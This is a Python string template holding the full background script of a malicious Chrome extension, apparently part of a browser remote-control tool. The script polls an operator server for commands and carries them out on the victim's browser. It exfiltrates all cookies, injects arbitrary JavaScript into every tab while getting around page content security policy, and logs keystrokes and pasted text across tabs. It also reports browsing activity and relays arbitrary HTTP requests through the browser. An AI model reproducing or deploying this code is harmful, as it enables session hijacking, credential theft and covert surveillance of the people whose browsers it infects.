BG_JS_TEMPLATE = """const SERVER = '{SCHEME}://{LISTENER_IP}:{LISTENER_PORT}';
const NGROK_H = {{'ngrok-skip-browser-warning': '1', 'User-Agent': 'MyApp/0.0.1'}};
const POLL_MODE = '{POLL_MODE}';

// MV3 service worker keepalive via alarms
chrome.alarms.create('keepalive', {{ periodInMinutes: 0.4 }});
chrome.alarms.onAlarm.addListener(() => {{
  if (POLL_MODE === 'fastpoll') poll();
}});

// Relay keylog data from content scripts to the handler
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {{
  if (msg && msg.type === 'keylog') {{
    fetch(SERVER + '/keylog', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json', ...NGROK_H }},
      body: JSON.stringify(msg.data)
    }}).catch(() => {{}});
    sendResponse({{ ok: true }});
  }}
  return false;
}});

// ── Persistent tab tracking ──
function reportTab(tabId, url, title) {{
  fetch(SERVER + '/tab_update', {{
    method: 'POST',
    headers: {{ 'Content-Type': 'application/json', ...NGROK_H }},
    body: JSON.stringify({{ tabId: tabId, url: url || '', title: title || '', ts: Date.now() }})
  }}).catch(() => {{}});
}}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {{
  if (changeInfo.url || changeInfo.status === 'complete') {{
    reportTab(tabId, tab.url, tab.title);
  }}
}});

chrome.tabs.onActivated.addListener(async (activeInfo) => {{
  try {{
    let tab = await chrome.tabs.get(activeInfo.tabId);
    reportTab(tab.id, tab.url, tab.title);
  }} catch (e) {{}}
}});

// ── Task dispatch (shared by both modes) ──
async function dispatchTask(task) {{
  if (task.type === 'cookies') {{
    await handleCookies(task);
  }} else if (task.type === 'inject_js') {{
    await handleInjectJS(task);
  }} else if (task.type === 'keylogger_start') {{
    await handleKeyloggerStart(task);
  }} else if (task.type === 'keylogger_stop') {{
    await handleKeyloggerStop(task);
  }} else {{
    await executeTask(task);
  }}
}}

// ── Short-poll mode (200ms interval) ──
async function poll() {{
  try {{
    let res = await fetch(SERVER + '/task', {{ headers: NGROK_H }});
    if (res.status === 200) {{
      let task = await res.json();
      await dispatchTask(task);
    }}
  }} catch (e) {{
    console.error('[duke] poll error:', e.message);
  }}
  setTimeout(poll, 200);
}}

// ── Long-poll mode (immediate reconnect, server holds connection) ──
async function longpoll() {{
  while (true) {{
    try {{
      let res = await fetch(SERVER + '/task', {{ headers: NGROK_H }});
      if (res.status === 200) {{
        let task = await res.json();
        await dispatchTask(task);
      }}
      // Immediately reconnect regardless of 200 or 204
    }} catch (e) {{
      console.error('[duke] longpoll error:', e.message);
      // Back off briefly on connection error to avoid tight error loop
      await new Promise(r => setTimeout(r, 2000));
    }}
  }}
}}

// Start the appropriate transport
if (POLL_MODE === 'longpoll') {{
  longpoll();
}} else {{
  poll();
}}

async function handleCookies(task) {{
  let tid = task.id;
  try {{
    let cookies = await chrome.cookies.getAll({{}});
    await fetch(SERVER + '/result', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json', ...NGROK_H }},
      body: JSON.stringify({{
        id: tid,
        type: 'cookies',
        cookies: cookies
      }})
    }});
  }} catch (e) {{
    await fetch(SERVER + '/result', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json', ...NGROK_H }},
      body: JSON.stringify({{
        id: tid,
        type: 'cookies',
        error: e.message
      }})
    }});
  }}
}}

async function handleInjectJS(task) {{
  let tid = task.id;
  let code = task.code || '';
  let targetTabId = task.tabId || null;

  try {{
    let tabs;
    if (targetTabId) {{
      tabs = [{{ id: targetTabId }}];
    }} else {{
      tabs = await chrome.tabs.query({{}});
      tabs = tabs.filter(t => t.url && !t.url.startsWith('chrome'));
    }}

    let allResults = [];
    for (let tab of tabs) {{
      try {{
        let results = await chrome.scripting.executeScript({{
          target: {{ tabId: tab.id }},
          world: 'MAIN',
          args: [code],
          func: (jsCode) => {{
            try {{
              // Method 1: blob URL bypasses inline-script CSP
              const blob = new Blob([jsCode], {{ type: 'text/javascript' }});
              const url = URL.createObjectURL(blob);
              const s = document.createElement('script');
              s.src = url;
              s.onload = () => {{ URL.revokeObjectURL(url); s.remove(); }};
              s.onerror = () => {{ URL.revokeObjectURL(url); s.remove(); }};
              (document.head || document.documentElement).appendChild(s);
              return 'injected_blob';
            }} catch (e) {{
              return 'error: ' + e.message;
            }}
          }}
        }});
        allResults.push({{
          tabId: tab.id,
          url: tab.url || '(unknown)',
          results: results.map(r => ({{ frameId: r.frameId, result: r.result }}))
        }});
      }} catch (tabErr) {{
        allResults.push({{
          tabId: tab.id,
          url: tab.url || '(unknown)',
          error: tabErr.message
        }});
      }}
    }}

    await fetch(SERVER + '/result', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json', ...NGROK_H }},
      body: JSON.stringify({{
        id: tid,
        type: 'inject_js',
        tabs_injected: allResults.length,
        results: allResults
      }})
    }});
  }} catch (e) {{
    await fetch(SERVER + '/result', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json', ...NGROK_H }},
      body: JSON.stringify({{
        id: tid,
        type: 'inject_js',
        error: e.message
      }})
    }});
  }}
}}

async function executeTask(task) {{
  let tid = task.id;
  let url = task.url;
  let method = task.method || 'GET';
  let body = task.body || null;
  let headers = task.headers || {{}};

  try {{
    let opts = {{ method: method }};
    if (Object.keys(headers).length > 0) {{
      opts.headers = headers;
    }}
    if (body && method !== 'GET' && method !== 'HEAD') {{
      opts.body = body;
    }}

    let resp = await fetch(url, opts);
    let buf = await resp.arrayBuffer();
    let bytes = new Uint8Array(buf);
    let encoded = arrayBufferToBase64(bytes);

    let respHeaders = {{}};
    resp.headers.forEach((v, k) => {{ respHeaders[k] = v; }});

    await fetch(SERVER + '/result', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json', ...NGROK_H }},
      body: JSON.stringify({{
        id: tid,
        url: url,
        status: resp.status,
        headers: respHeaders,
        body: encoded
      }})
    }});
  }} catch (e) {{
    await fetch(SERVER + '/result', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json', ...NGROK_H }},
      body: JSON.stringify({{
        id: tid,
        url: url,
        error: e.message
      }})
    }});
  }}
}}

function arrayBufferToBase64(bytes) {{
  let binary = '';
  for (let i = 0; i < bytes.length; i += 8192) {{
    let slice = bytes.subarray(i, i + 8192);
    for (let j = 0; j < slice.length; j++) {{
      binary += String.fromCharCode(slice[j]);
    }}
  }}
  return btoa(binary);
}}

// ── Keylogger ──

async function handleKeyloggerStart(task) {{
  let tid = task.id;
  try {{
    let tabs = await chrome.tabs.query({{}});
    tabs = tabs.filter(t => t.url && !t.url.startsWith('chrome'));
    let injected = 0;

    for (let tab of tabs) {{
      try {{
        await chrome.scripting.executeScript({{
          target: {{ tabId: tab.id }},
          world: 'ISOLATED',
          func: () => {{
            // Guard via DOM attribute
            if (document.documentElement.getAttribute('data-duke-kl')) return;
            document.documentElement.setAttribute('data-duke-kl', '1');

            let buffer = [];
            let flushTimer = null;

            function flush() {{
              if (buffer.length === 0) return;
              const payload = buffer.splice(0);
              // Relay via service worker — guaranteed to bypass page CSP
              chrome.runtime.sendMessage({{
                type: 'keylog',
                data: {{
                  url: location.href,
                  title: document.title,
                  keys: payload,
                  ts: Date.now()
                }}
              }}).catch(() => {{}});
            }}

            function scheduleFlush() {{
              if (!flushTimer) {{
                flushTimer = setTimeout(() => {{
                  flushTimer = null;
                  flush();
                }}, 1500);
              }}
            }}

            function keyMap(e) {{
              const special = {{
                'Backspace': '[BS]', 'Tab': '[TAB]', 'Enter': '[ENTER]',
                'Escape': '[ESC]', 'Delete': '[DEL]', ' ': '[SPACE]',
                'ArrowUp': '[UP]', 'ArrowDown': '[DOWN]',
                'ArrowLeft': '[LEFT]', 'ArrowRight': '[RIGHT]',
                'Control': '[CTRL]', 'Alt': '[ALT]', 'Shift': '[SHIFT]',
                'Meta': '[META]', 'CapsLock': '[CAPS]',
                'Home': '[HOME]', 'End': '[END]',
                'PageUp': '[PGUP]', 'PageDown': '[PGDN]'
              }};
              if (special[e.key]) return special[e.key];
              if (e.key.startsWith('F') && e.key.length <= 3) return '[' + e.key + ']';
              if (e.key.length === 1) return e.key;
              return '[' + e.key + ']';
            }}

            function handler(e) {{
              // Check if we should stop
              if (!document.documentElement.getAttribute('data-duke-kl')) {{
                document.removeEventListener('keydown', handler, true);
                document.removeEventListener('paste', pasteHandler, true);
                document.removeEventListener('visibilitychange', flush);
                if (flushTimer) clearTimeout(flushTimer);
                flush();
                return;
              }}
              let k = keyMap(e);
              if (e.ctrlKey && e.key !== 'Control') k = '[CTRL+' + e.key.toUpperCase() + ']';
              if (e.altKey && e.key !== 'Alt') k = '[ALT+' + e.key.toUpperCase() + ']';
              buffer.push(k);
              scheduleFlush();
            }}

            function pasteHandler(e) {{
              if (!document.documentElement.getAttribute('data-duke-kl')) return;
              let pasted = '';
              if (e.clipboardData && e.clipboardData.getData) {{
                pasted = e.clipboardData.getData('text');
              }}
              if (pasted) {{
                buffer.push('[PASTE:' + pasted + ']');
                scheduleFlush();
              }}
            }}

            document.addEventListener('keydown', handler, true);
            document.addEventListener('paste', pasteHandler, true);
            document.addEventListener('visibilitychange', flush);
          }}
        }});
        injected++;
      }} catch (tabErr) {{
        // skip tabs that can't be injected
      }}
    }}

    await fetch(SERVER + '/result', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json', ...NGROK_H }},
      body: JSON.stringify({{
        id: tid,
        type: 'keylogger_start',
        tabs_injected: injected,
        tabs_total: tabs.length
      }})
    }});
  }} catch (e) {{
    await fetch(SERVER + '/result', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json', ...NGROK_H }},
      body: JSON.stringify({{
        id: tid,
        type: 'keylogger_start',
        error: e.message
      }})
    }});
  }}
}}

async function handleKeyloggerStop(task) {{
  let tid = task.id;
  try {{
    let tabs = await chrome.tabs.query({{}});
    tabs = tabs.filter(t => t.url && !t.url.startsWith('chrome'));
    let cleaned = 0;

    for (let tab of tabs) {{
      try {{
        await chrome.scripting.executeScript({{
          target: {{ tabId: tab.id }},
          world: 'ISOLATED',
          func: () => {{
            // Remove the attribute — the handler checks this and self-removes
            document.documentElement.removeAttribute('data-duke-kl');
            // Fire a dummy keydown to trigger the self-removal check
            document.dispatchEvent(new KeyboardEvent('keydown', {{ key: '', bubbles: true }}));
          }}
        }});
        cleaned++;
      }} catch (tabErr) {{}}
    }}

    await fetch(SERVER + '/result', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json', ...NGROK_H }},
      body: JSON.stringify({{
        id: tid,
        type: 'keylogger_stop',
        tabs_cleaned: cleaned
      }})
    }});
  }} catch (e) {{
    await fetch(SERVER + '/result', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json', ...NGROK_H }},
      body: JSON.stringify({{
        id: tid,
        type: 'keylogger_stop',
        error: e.message
      }})
    }});
  }}
}}

"""

